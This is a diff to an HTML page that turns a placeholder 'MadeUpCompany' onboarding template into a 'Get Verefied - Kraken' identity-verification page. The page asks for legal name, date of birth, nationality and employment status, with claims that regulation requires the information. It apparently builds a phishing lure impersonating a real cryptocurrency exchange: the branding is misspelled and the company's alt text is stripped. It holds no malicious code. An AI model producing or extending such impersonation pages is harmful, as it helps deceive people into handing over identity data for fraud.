@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Onboarding Poll - Step 1 - MadeUpCompany</title>
-  <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
+  <title>Get Verefied - Kraken</title>
+  <link rel="icon" type="image" href="../img/favicon.ico">
   <link rel="stylesheet" href="../css/style.css">
 </head>
 <body>
@@ -12,21 +12,12 @@
   <!-- Global Header -->
   <header class="global-header">
     <a href="../index.html" class="logo-slot">
-      <img src="../img/logo-full.svg" alt="MadeUpCompany" class="logo-img">
+      <img src="../img/logo-full.svg" class="logo-img">
     </a>
 
     <div class="header-actions">
       <label class="lang-pill">
         <img src="../img/icons/globe.svg" alt="" class="lang-icon" width="16" height="16">
-        <select class="lang-select">
-          <option>English (US)</option>
-          <option>Slovenščina</option>
-          <option>Español</option>
-          <option>Deutsch</option>
-        </select>
-        <svg class="lang-chevron" width="10" height="10" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M4 6l4 4 4-4"/>
-        </svg>
       </label>
       <a href="login.html" class="btn-header-light">Sign out</a>
     </div>
@@ -40,22 +31,22 @@
     </div>
 
     <div class="card text-left">
-      <h1 class="card-title">Info Page 1</h1>
-      <p class="card-sub">Text1.</p>
+      <h1 class="card-title-soft">Let's get you verified</h1>
+      <p class="card-sub">This information helps us verify your identity. We're legally required to collect this info. <a href="#">Learn more</a></p>
 
       <h2 class="section-title">First and Last name</h2>
-      <p class="section-sub">Text3.</p>
+      <p class="section-sub">Make sure your name and date of birth matches what's on your government-issued ID.</p>
 
       <form action="poll-2.html" method="GET" novalidate>
         <div class="name-row">
           <div class="name-col field-group">
             <input type="text" id="fname" class="text-field" placeholder=" " autocomplete="given-name" required>
-            <label class="floating-label" for="fname">first name</label>
+            <label class="floating-label" for="fname">Legal first name (given name)</label>
             <div class="field-error-msg">Missing required field</div>
           </div>
           <div class="name-col field-group">
             <input type="text" id="lname" class="text-field" placeholder=" " autocomplete="family-name" required>
-            <label class="floating-label" for="lname">last name</label>
+            <label class="floating-label" for="lname">Legal last name (surname)</label>
             <div class="field-error-msg">Missing required field</div>
           </div>
         </div>
@@ -65,7 +56,7 @@
           <label class="floating-label" for="dob">Date of birth</label>
         </div>
 
-        <h2 class="section-title">Info 2</h2>
+        <h2 class="section-title">Personal Info</h2>
         <div class="field-group">
           <select id="nationality-select" class="text-field" required>
             <option value="" disabled selected></option>
@@ -574,18 +565,18 @@
           </div>
         </div>
 
-        <h2 class="section-title">pick your option</h2>
-        <p class="section-sub">text 4.</p>
+        <h2 class="section-title">What is your employment status?</h2>
+        <p class="section-sub">If you're unsure, pick the closest fit.</p>
 
         <div class="radio-list">
-          <label class="radio-item"><input type="radio" name="opt" checked> <span>option 1</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>option 2</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>option 3</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>option 4</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>option 5</span></label>
+          <label class="radio-item"><input type="radio" name="opt" checked> <span>Employed</span></label>
+          <label class="radio-item"><input type="radio" name="opt"> <span>Unemployed</span></label>
+          <label class="radio-item"><input type="radio" name="opt"> <span>Retired</span></label>
+          <label class="radio-item"><input type="radio" name="opt"> <span>Student</span></label>
+          <label class="radio-item"><input type="radio" name="opt"> <span>Self-Employed or Business Owner</span></label>
         </div>
 
-        <p class="disclaimer text-center">text 6.</p>
+        <p class="disclaimer text-center">Local regulation requires us to ask.</p>
         <button type="submit" class="btn btn-primary">Continue</button>
       </form>
     </div>
